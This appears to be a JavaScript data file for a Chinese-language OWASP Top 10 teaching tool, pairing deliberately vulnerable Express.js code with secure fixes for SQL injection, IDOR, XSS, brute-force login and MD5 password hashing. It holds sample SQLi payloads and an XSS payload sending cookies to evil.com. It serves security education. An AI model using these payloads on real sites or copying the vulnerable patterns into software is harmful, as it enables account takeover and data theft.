export const OWASP_VULNERABILITIES = [
  {
    id: 'injection-sqli',
    owaspCode: 'A03:2021',
    name: 'Injection (注入攻擊 - SQL 注入)',
    englishName: 'SQL Injection (SQLi)',
    category: 'Injection',
    severity: 'Critical',
    sandboxType: 'sqli',
    icon: 'Database',
    summary: '當不可信的使用者輸入直接拼接進 SQL 語句時，攻擊者可藉由惡意閉合語法，竄改後端查詢邏輯，繞過身分驗證或竊取整座資料庫。',
    occurrences: [
      {
        title: '會員/管理員登入表單',
        description: '後端以 "SELECT * FROM users WHERE user=\'" + req.body.user + "\' AND pass=\'..." 驗證登入，駭客輸入 \' OR 1=1 -- 導致條件恆真，無須密碼即登入。'
      },
      {
        title: '電商商品搜尋與分類篩選',
        description: '在 URL 參數如 /products?category=books 或 /search?keyword=phone 拼接 SQL，可利用 UNION SELECT 跨表偷取使用者密碼雜湊與信用卡號。'
      },
      {
        title: '分頁與排序參數 (ORDER BY / LIMIT)',
        description: '開發者常對 WHERE 參數做過濾，卻忽略了 ORDER BY 或 LIMIT 無法使用標準參數化查詢，若直接拼接便會成為隱蔽的注入點。'
      }
    ],
    principle: `
SQL 注入的本質是**「資料與指令的混淆」**。
在正常的系統中，使用者的輸入應該純粹被當作「字串資料 (Data)」處理。
然而，當工程師使用字串拼接（String Concatenation）組合 SQL 時，攻擊者輸入的單引號 (\`'\`)、註解符號 (\`--\` 或 \`#\`) 以及布林邏輯運算子 (\`OR\`、\`AND\`) 會直接被資料庫的語法分析器（Parser）解析成「控制指令 (Control Logic)」。

攻擊者因此能強行改變 WHERE 判斷式的布林邏輯（例如使條件變成恆真的 \`'1'='1'\`），或透過 \`UNION\` 運算子串接另一條惡意查詢，把原本不應公開的系統表格資料強制返回給前端。
    `,
    impact: [
      '完全繞過登入身分驗證，直接取得管理員權限',
      '跨表拖庫（Dump Database），洩漏會員密碼雜湊、個人隱私與交易資料',
      '在部分資料庫設定下可執行 xp_cmdshell 或 INTO OUTFILE，進一步奪取主機 Shell 權限'
    ],
    vulnerableCode: {
      language: 'javascript',
      title: '❌ 存在漏洞的寫法 (字串拼接)',
      code: `// Express.js + MySQL 脆弱範例
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  // ⚠️ 致命缺陷：直接拼接不可信的使用者輸入
  const sql = "SELECT id, username, role FROM users " +
              "WHERE username = '" + username + "' " +
              "AND password = '" + password + "'";

  const [rows] = await db.query(sql);

  if (rows.length > 0) {
    res.json({ success: true, user: rows[0] });
  } else {
    res.status(401).json({ error: '帳號或密碼錯誤' });
  }
});`
    },
    secureCode: {
      language: 'javascript',
      title: '✅ 安全修復寫法 (參數化查詢 / Prepared Statements)',
      code: `// 使用佔位符 ? 進行參數化查詢
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  // 🛡️ 安全機制：資料庫先編譯 SQL 結構，再將參數當作純文字填入
  const sql = "SELECT id, username, password_hash, role FROM users WHERE username = ?";
  const [rows] = await db.query(sql, [username]);

  if (rows.length === 0) {
    return res.status(401).json({ error: '帳號或密碼錯誤' });
  }

  // 搭配安全密碼雜湊比對 (bcrypt)
  const isMatch = await bcrypt.compare(password, rows[0].password_hash);
  if (isMatch) {
    res.json({ success: true, user: { id: rows[0].id, role: rows[0].role } });
  } else {
    res.status(401).json({ error: '帳號或密碼錯誤' });
  }
});`
    }
  },
  {
    id: 'broken-access-control-idor',
    owaspCode: 'A01:2021',
    name: 'Broken Access Control (失效的存取控制 / IDOR)',
    englishName: 'Insecure Direct Object References (IDOR)',
    category: 'Access Control',
    severity: 'Critical',
    sandboxType: 'idor',
    icon: 'KeyRound',
    summary: '後端僅驗證了使用者「已登入」，卻未檢查「這名使用者是否有權限存取該特定資源」，導致修改 URL 或 API 中的 ID 即可查看或修改他人的機密資料。',
    occurrences: [
      {
        title: '訂單 / 發票 / 收據查詢頁面',
        description: '使用者點擊「查看我的訂單」時，前端請求 /api/orders?id=1025。駭客只要手動將 1025 改為 1024、1023，即可橫向越權抓出全站客戶的購物紀錄與地址。'
      },
      {
        title: '健檢報告 / 薪資單 / 契約檔案下載',
        description: '檔案下載連結如 /download.php?file=report_1089.pdf，後端未檢查檔案擁有者，直接將檔案串流傳回，造成嚴重的個資外洩事件。'
      },
      {
        title: '密碼重設與個人資料修改',
        description: '呼叫 PUT /api/user/profile 時，Payload 包含 { user_id: 88, email: "new@mail.com" }，後端未比對 JWT Token 中的身份，直接更新了 user 88 的資料。'
      }
    ],
    principle: `
IDOR (不安全的直接物件引用) 是 OWASP Top 10 第一名「Broken Access Control」最典型的代表。
它的核心缺陷在於：**系統把內部物件的直接識別碼（如資料庫的主鍵自增 ID: 1001, 1002）暴露在 API 或 URL 中，且伺服器端缺乏權限驗證邏輯。**

許多初學者工程師常犯的錯誤是：
1. 以為「前端畫面只給當前使用者看自己的按鈕」就安全了（忽略了攻擊者可以用 Postman 或瀏覽器 F12 竄改 API 請求）。
2. 只在路由加了 \`checkIsLoggedIn\` (有登入即可)，卻沒寫 \`checkResourceOwnership\` (檢查是否為資源擁有者)。
    `,
    impact: [
      '橫向越權（Horizontal Privilege Escalation）：查看、竄改或刪除其他平級使用者的敏感資料',
      '縱向越權（Vertical Privilege Escalation）：一般使用者直接調用管理員專屬 API',
      '大量自動化爬取（Scraping）：因為 ID 是連續流水號，攻擊者可寫迴圈抓光整站資料庫'
    ],
    vulnerableCode: {
      language: 'javascript',
      title: '❌ 存在漏洞的寫法 (缺乏資源歸屬檢查)',
      code: `// GET /api/orders/:orderId
app.get('/api/orders/:orderId', authenticateToken, async (req, res) => {
  const { orderId } = req.params;

  // ⚠️ 致命缺陷：只用 orderId 查詢，沒檢查這張訂單是不是 req.user 的！
  const order = await db.orders.findById(orderId);

  if (!order) {
    return res.status(404).json({ error: '訂單不存在' });
  }

  // 任何登入的使用者只要改 orderId，就能看別人的私人資料
  res.json(order);
});`
    },
    secureCode: {
      language: 'javascript',
      title: '✅ 安全修復寫法 (強制綁定 Session/JWT 身分驗證)',
      code: `// GET /api/orders/:orderId
app.get('/api/orders/:orderId', authenticateToken, async (req, res) => {
  const { orderId } = req.params;
  const currentUserId = req.user.id; // 從已驗證的 Token 解析

  // 🛡️ 雙重檢查：限定必須是當前用戶的訂單，或是系統管理員
  const order = await db.orders.findOne({
    where: { 
      id: orderId,
      userId: currentUserId // 確保只能查詢自己的資源
    }
  });

  if (!order) {
    // 提示 404 或 403，避免洩露訂單存在性
    return res.status(404).json({ error: '找不到該訂單或無權限存取' });
  }

  res.json(order);
});`
    }
  },
  {
    id: 'xss-cross-site-scripting',
    owaspCode: 'A03:2021',
    name: 'Cross-Site Scripting (XSS 跨站腳本攻擊)',
    englishName: 'Cross-Site Scripting (XSS)',
    category: 'Injection / Data Handling',
    severity: 'High',
    sandboxType: 'xss',
    icon: 'Code2',
    summary: '網頁未對使用者輸入進行 HTML 實體轉義或過濾，直接插入 DOM 渲染，導致惡意 JavaScript 代碼在受害者的瀏覽器上直接執行，進而竊取 Session Cookie 或偽冒身分操作。',
    occurrences: [
      {
        title: '社群動態、部落格文章與留言板 (Stored XSS)',
        description: '攻擊者發表帶有 <script> 或 <img onerror=...> 的惡意留言，留言被存入資料庫；之後任何造訪該網頁的正常使用者都會在不知情下執行該腳本。'
      },
      {
        title: '站內搜尋與錯誤回顯 (Reflected XSS)',
        description: '使用者點擊釣魚連結 /search?q=<script>...，伺服器直接在 HTML 回傳「您搜尋的關鍵字是：<script>...」，腳本在點擊者當下瀏覽器執行。'
      },
      {
        title: '前端單頁應用 (SPA) 誤用 innerHTML (DOM XSS)',
        description: '前端代碼使用 el.innerHTML = location.hash 或 React 的 dangerouslySetInnerHTML，讓攻擊者透過構造惡意 URL 達成本地 DOM 注入。'
      }
    ],
    principle: `
XSS 攻擊的核心在於：**「瀏覽器無法區分網頁中的 JavaScript 是來自網站開發者，還是來自惡意攻擊者的輸入」**。

當網頁伺服器或前端 JavaScript 把使用者提交的資料直接拼接到 HTML 模板時：
例如：\`<div>歡迎回來，\` + \`username\` + \`</div>\`
如果攻擊者的 username 是 \`<img src=x onerror="fetch('//evil.com?c='+document.cookie)">\`，瀏覽器解析到 \`<img>\` 標籤載入失敗時，便會無條件觸發 \`onerror\` 事件中的 JavaScript 程式碼！

因為這段程式碼是在受害者的瀏覽器環境下運行，它擁有網站完整的 DOM 存取權限，能夠讀取 \`document.cookie\`、\`localStorage\`、監聽鍵盤輸入，甚至幫使用者發出轉帳請求。
    `,
    impact: [
      '竊取使用者的 Session Token / JWT，導致帳號直接被劫持 (Account Takeover)',
      '在受害者瀏覽器上進行惡意釣魚轉址，或偽造登入彈窗騙取二次密碼',
      '鍵盤側錄 (Keylogger) 記錄使用者在網頁上輸入的任何表單與信用卡資訊'
    ],
    vulnerableCode: {
      language: 'javascript',
      title: '❌ 存在漏洞的寫法 (未經轉義直接 innerHTML)',
      code: `// 脆弱的留言板前端渲染
function renderComment(comment) {
  const container = document.getElementById('comments');
  const div = document.createElement('div');
  
  // ⚠️ 致命缺陷：直接將不可信內容放入 innerHTML
  div.innerHTML = '<p class="author">' + comment.author + ':</p>' +
                  '<p class="content">' + comment.content + '</p>';
  
  container.appendChild(div);
}`
    },
    secureCode: {
      language: 'javascript',
      title: '✅ 安全修復寫法 (textContent 轉義與 HttpOnly Cookie)',
      code: `// 🛡️ 1. 使用 textContent 或安全轉義庫 (如 DOMPurify)
function renderComment(comment) {
  const container = document.getElementById('comments');
  const div = document.createElement('div');

  const author = document.createElement('p');
  author.className = 'author';
  author.textContent = comment.author; // 安全：純文字不執行 HTML 標籤

  const content = document.createElement('p');
  content.className = 'content';
  content.textContent = comment.content; // 瀏覽器自動轉義 < > & "

  div.appendChild(author);
  div.appendChild(content);
  container.appendChild(div);
}

// 🛡️ 2. 後端設置 HttpOnly Cookie，阻止 JavaScript 存取敏感 Session
res.cookie('sessionId', token, {
  httpOnly: true, // document.cookie 讀取不到，防禦 XSS 盜取 Token
  secure: true,   // 僅允許 HTTPS 傳輸
  sameSite: 'strict'
});`
    }
  },
  {
    id: 'identification-authentication-failures',
    owaspCode: 'A07:2021',
    name: 'Identification & Auth Failures (身分驗證失效 / 暴力破解)',
    englishName: 'Identification and Authentication Failures',
    category: 'Authentication',
    severity: 'High',
    sandboxType: 'bruteforce',
    icon: 'ShieldAlert',
    summary: '網站缺乏登入頻率限制 (Rate Limiting)、防自動化工具機制 (CAPTCHA) 或弱密碼阻擋，讓攻擊者可透過撞庫攻擊 (Credential Stuffing) 或字典檔暴力破解帳號。',
    occurrences: [
      {
        title: '登入與密碼找回 API 沒有速率限制',
        description: '攻擊者使用 Burp Suite Intruder 或 Python 腳本，每秒對 POST /api/login 送出數百次請求測試字典密碼，伺服器全部照單全收。'
      },
      {
        title: '過度詳細的錯誤訊息提示 (帳號枚舉)',
        description: '登入失敗時顯示「該電子信箱未註冊」，讓駭客可以預先篩選出哪些人是該站會員，接著專注針對存在的帳號發動密碼猜測。'
      },
      {
        title: '簡訊 OTP 驗證碼為 4 位數字且未限制重試次數',
        description: '4 位數 OTP 只有 10,000 種組合。若 API 未設定 3 次錯誤即失效，攻擊者只需數十秒便能枚舉出正確的驗證碼。'
      }
    ],
    principle: `
身分識別與驗證失效的根本原因，在於**伺服器假設所有的 HTTP 請求都是「人類親手在鍵盤上一個個輸入」的**。

在現實中，攻擊者使用多執行緒工具與自動化機器人（Bot）：
1. **字典攻擊 (Dictionary Attack)**：拿最常見的前 10,000 個弱密碼（如 123456, password, admin888）測試單一目標。
2. **撞庫攻擊 (Credential Stuffing)**：拿其他網站外洩的數億筆帳號密碼，批次嘗試登入你的網站（因為多數使用者在各網站使用相同密碼）。

如果伺服器沒有防護機制：
- 沒有 IP / 帳號維度的 Rate Limiting (速率限制)
- 沒有漸進式延遲或驗證碼 (CAPTCHA)
- 沒有多因素驗證 (MFA / 2FA)
弱密碼通常在幾秒到幾分鐘內就會被破解。
    `,
    impact: [
      '管理員帳號被撞破，導致整座平台後台全面失守',
      '會員資產（虛擬點數、折價券、信用卡綁定）被盜刷',
      '伺服器承受巨大的自動化攻擊流量，引發應用層拒絕服務 (DDoS)'
    ],
    vulnerableCode: {
      language: 'javascript',
      title: '❌ 存在漏洞的寫法 (無次數限制與枚舉回顯)',
      code: `// 脆弱的登入處理
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await db.users.findOne({ email });

  // ⚠️ 缺陷 1：詳細回顯暴露帳號存在性 (帳號枚舉)
  if (!user) {
    return res.status(404).json({ error: '此電子郵件尚未註冊' });
  }

  // ⚠️ 缺陷 2：完全沒有 Rate Limit，駭客可無限次嘗試 password
  const isMatch = await bcrypt.compare(password, user.passwordHash);
  if (!isMatch) {
    return res.status(401).json({ error: '密碼錯誤' });
  }

  res.json({ token: generateToken(user) });
});`
    },
    secureCode: {
      language: 'javascript',
      title: '✅ 安全修復寫法 (Rate Limit 限制與模糊回顯)',
      code: `import rateLimit from 'express-rate-limit';

// 🛡️ 1. 設置 IP / 路由層級的登入速率限制
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 分鐘
  max: 5, // 每個 IP 最多允許 5 次嘗試
  message: { error: '嘗試次數過多，請於 15 分鐘後再試或重設密碼' },
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/api/login', loginLimiter, async (req, res) => {
  const { email, password } = req.body;
  const user = await db.users.findOne({ email });

  // 🛡️ 2. 一致性錯誤訊息，不暴露帳號是否存在
  const dummyHash = '$2b$10$w...'; // 防止 timing attack
  const isMatch = user 
    ? await bcrypt.compare(password, user.passwordHash)
    : await bcrypt.compare(password, dummyHash);

  if (!user || !isMatch) {
    return res.status(401).json({ error: '帳號或密碼不正確' });
  }

  res.json({ token: generateToken(user) });
});`
    }
  },
  {
    id: 'cryptographic-failures',
    owaspCode: 'A02:2021',
    name: 'Cryptographic Failures (加密機制失效)',
    englishName: 'Cryptographic Failures',
    category: 'Cryptography',
    severity: 'High',
    sandboxType: 'crypto',
    icon: 'Lock',
    summary: '使用已被破解的弱雜湊演算法（如 MD5 / SHA-1）或未加鹽（Salt）儲存密碼，使得駭客在資料庫洩漏後，可用預先計算的彩虹表 (Rainbow Table) 於毫秒內反查出原始明文密碼。',
    occurrences: [
      {
        title: '資料庫密碼儲存採用 MD5 / SHA1 雜湊',
        description: '歷史悠久的舊系統常直接以 md5(password) 存入資料庫。一旦 DB 被 Dump，攻擊者直接貼到 Rainbow Table 網站一秒逆推明文。'
      },
      {
        title: '敏感資料傳輸未使用 HTTPS / TLS',
        description: '在公共咖啡廳 Wi-Fi 環境下，使用者傳輸的帳號密碼或 Session Cookie 透過 HTTP 明文傳播，任何同網段駭客以 Wireshark 即可直接側錄。'
      },
      {
        title: '自行發明「加解密演算法」或使用固定金鑰',
        description: '部分開發者因不熟悉標準庫，自行撰寫簡易 XOR 或移位加密，或將 AES 金鑰寫死在前端 JavaScript 原始碼中。'
      }
    ],
    principle: `
密碼安全儲存的核心原則：**「單向不可逆雜湊 (One-way Hash)」搭配「加鹽 (Salt)」與「工作因子 (Work Factor)」**。

傳統 MD5、SHA-1 或 SHA-256 是為了「高速資料校驗」而設計的：
- 一張現代顯卡 (RTX 4090) 每秒可以計算超過 **1000 億次** MD5！
- 駭客預先將數十億常用密碼算好 MD5，建構出龐大的查詢字典，這就是**彩虹表 (Rainbow Table)**。

若系統沒有使用 **動態隨機 Salt**（即使兩個人密碼一樣，存入資料庫的雜湊值也完全不同），彩虹表就能直接「逆查」出密碼。
因此，現代資安標準強制規定必須使用專為密碼設計的「慢速慢雜湊」，如 **bcrypt, Argon2id, PBKDF2**。
    `,
    impact: [
      '資料庫外洩時，全體使用者的真實密碼在數小時內被全面反解',
      '用戶因密碼重複使用習慣，導致其他關聯服務（信箱、銀行）連鎖被盜',
      '違反 GDPR、台灣個人資料保護法，面臨巨額法律罰鍰與商譽受損'
    ],
    vulnerableCode: {
      language: 'javascript',
      title: '❌ 存在漏洞的寫法 (快速雜湊且未加鹽)',
      code: `const crypto = require('crypto');

// ⚠️ 致命缺陷：使用極速且無鹽的 MD5 儲存密碼
function hashPassword(password) {
  return crypto.createHash('md5').update(password).digest('hex');
}

// 若 Alice 和 Bob 都使用 "password123"
// 資料庫儲存的都是：482c811da5d5b4bc6d497ffa98491e38
// 駭客用彩虹表一查就知道兩人的密碼是 password123！`
    },
    secureCode: {
      language: 'javascript',
      title: '✅ 安全修復寫法 (bcrypt 動態加鹽與可調計算複雜度)',
      code: `const bcrypt = require('bcrypt');

const SALT_ROUNDS = 12; // 調整工作因子，提高暴力破解成本 (每次約需 250ms)

// 🛡️ 註冊儲存密碼：自動生成隨機鹽，混入雜湊中
async function hashUserPassword(plainPassword) {
  const hash = await bcrypt.hash(plainPassword, SALT_ROUNDS);
  return hash; 
  // 輸出範例: $2b$12$e8xO.P8u7y6t5r4e3w2q1u...
  // 即使兩人密碼一樣，每次生成的 hash 也絕對不同，彩虹表完全失效！
}

// 🛡️ 驗證登入
async function verifyUserPassword(plainPassword, storedHash) {
  return await bcrypt.compare(plainPassword, storedHash);
}`
    }
  }
];

export const OWASP_OVERVIEW_LIST = [
  { code: 'A01:2021', name: 'Broken Access Control (失效的存取控制)', risk: 'Critical', desc: '權限驗證缺失，造成越權存取他人資料或未授權管理功能' },
  { code: 'A02:2021', name: 'Cryptographic Failures (加密機制失效)', risk: 'High', desc: '明文傳輸、弱雜湊演算法 (MD5) 或無鹽密碼儲存' },
  { code: 'A03:2021', name: 'Injection (注入攻擊 - SQLi/XSS/Command)', risk: 'Critical', desc: '不可信資料混入指令，竄改查詢邏輯或執行惡意腳本' },
  { code: 'A04:2021', name: 'Insecure Design (不安全的架構設計)', risk: 'Medium', desc: '在架構與威脅建模階段就缺乏資安防禦思路' },
  { code: 'A05:2021', name: 'Security Misconfiguration (安全設定缺陷)', risk: 'High', desc: '開啟 Debug 模式、預設密碼未更換、錯誤堆疊洩漏資訊' },
  { code: 'A06:2021', name: 'Vulnerable and Outdated Components (易受攻擊與過期組件)', risk: 'High', desc: '使用已知漏洞的第三方套件或框架 (Log4j 等)' },
  { code: 'A07:2021', name: 'Identification and Authentication Failures (身份驗證失效)', risk: 'High', desc: '無次數限制遭受暴力破解、Session 洩漏或弱密碼政策' },
  { code: 'A08:2021', name: 'Software and Data Integrity Failures (軟體與資料完整性失效)', risk: 'Medium', desc: '反序列化未驗證不可信資料、未簽署的自動更新' },
  { code: 'A09:2021', name: 'Security Logging and Monitoring Failures (資安日誌與監控失效)', risk: 'Medium', desc: '未記錄關鍵操作與登入失敗，入侵發生時毫無知覺' },
  { code: 'A10:2021', name: 'Server-Side Request Forgery (SSRF 伺服端請求偽造)', risk: 'High', desc: '伺服器受指示抓取內部私網資源 (如雲端中繼資料 169.254.169.254)' },
];

